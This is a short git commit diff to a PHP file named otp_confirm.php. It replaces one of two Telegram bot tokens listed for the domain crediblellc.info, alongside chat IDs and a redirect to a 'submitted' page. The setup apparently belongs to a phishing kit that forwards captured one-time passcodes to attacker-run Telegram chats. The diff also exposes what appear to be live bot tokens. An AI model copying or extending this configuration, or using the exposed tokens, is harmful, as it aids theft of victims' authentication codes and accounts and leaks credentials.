bbfe2f2e7dbe0d3cf6af066bbe0e8130835e6caf
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2026-03-02 22:59:44 +0100

    Replace bot token in otp_confirm.php

--- otp_confirm.php
+++ otp_confirm.php
@@ -115,7 +115,7 @@ $site_map = [
     'crediblellc.info' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
-            ['token' => '8409219045:AAFYVOrhXeYiNrpyGsqKafjlugn9uW5hEyk', 'chat_id' => '5850580289']
+            ['token' => '8789303758:AAE6VNyi-6z8mJWbsCpLQbcNx_8tmTgnDsY', 'chat_id' => '5850580289']
         ],
         'redirect' => 'https://crediblellc.info/submitted.html'
     ],
